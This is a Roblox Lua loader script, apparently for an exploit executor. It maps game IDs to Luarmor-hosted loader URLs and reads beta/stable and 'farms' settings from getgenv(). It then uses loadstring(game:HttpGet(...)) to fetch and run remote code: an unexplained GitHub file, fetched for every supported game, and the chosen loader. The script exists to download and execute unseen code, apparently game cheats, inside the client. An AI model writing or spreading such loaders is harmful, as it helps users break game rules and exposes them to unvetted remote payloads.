repeat task.wait() until game:IsLoaded()

local players = game:GetService("Players")
local client = players.LocalPlayer

local success, error_msg = pcall(function()
    local game_urls = {
        [1087859240] = "https://api.luarmor.net/files/v3/loaders/40db47a67f36abb41c12726416589845.lua",
        [1359573625] = {
            beta = "https://api.luarmor.net/files/v3/loaders/936841afb30c4e5a9f063bc16b25dd61.lua",
            stable = "https://api.luarmor.net/files/v3/loaders/157f311f0c03767c211de326c8a5f05f.lua",
            farms = {
                beta = "https://api.luarmor.net/files/v4/loaders/d3280e0f1b18cde55d16adac23e57430.lua",
                stable = ""
            }
        }
    }
    
    local game_id = game.GameId
    local url_data = game_urls[game_id]
    
    if not url_data then 
        return 
    end
    
    local final_url
    
    if type(url_data) == "table" and game_id == 1359573625 then        
        local script_type = getgenv().script_type
        local mode = (getgenv().script_mode and getgenv().script_mode == "beta") and "beta" or "stable"

        if script_type == "farms" then
            if type(url_data.farms) == "table" then
                final_url = url_data.farms[mode] or url_data.farms["stable"]
            end
        else
            if type(url_data[mode]) == "string" then
                final_url = url_data[mode]
            else
                final_url = url_data.stable
            end
        end
    else
        final_url = url_data
    end

    loadstring(game:HttpGet("https://raw.githubusercontent.com/Aknoks/banshee/refs/heads/main/gaming.lua"))()
    loadstring(game:HttpGet(final_url))()
end)

if not success then
    return pcall(client.Kick, client, error_msg)
end
